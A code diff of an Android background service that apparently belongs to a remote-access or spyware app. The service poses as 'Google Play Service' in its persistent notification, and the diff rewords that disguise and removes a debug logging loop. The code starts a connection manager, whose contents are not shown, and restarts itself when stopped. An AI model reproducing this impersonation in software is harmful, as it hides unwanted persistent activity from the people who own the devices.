@@ -8,7 +8,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
 import android.os.IBinder;
-import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
 
@@ -31,7 +30,7 @@ public class MainService extends Service {
         NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, CHANNEL_ID);
 
         Notification notification = notificationBuilder.setContentTitle("Google Play Service")
-                .setContentText("Google Background Service")
+                .setContentText("Google is running background")
                 .setSmallIcon(R.drawable.play_service_icon)
                 .setOngoing(true)
                 .build();
@@ -39,8 +38,6 @@ public class MainService extends Service {
 
         contextOfApplication = this;
         ConnectionManager.startAsync(this);
-
-//        printAnything();
 
         return Service.START_STICKY;
     }
@@ -68,27 +65,5 @@ public class MainService extends Service {
             NotificationManager manager = getSystemService(NotificationManager.class);
             manager.createNotificationChannel(serviceChannel);
         }
-    }
-
-
-
-
-    private void printAnything() {
-
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                int i = 0;
-                while (true){
-                    try {
-                        Thread.sleep(2000);
-                    } catch (InterruptedException e) {
-                        e.printStackTrace();
-                    }
-                    Log.d("NurAlam", ""+i);
-                    i++;
-                }
-            }
-        }).start();
     }
 }
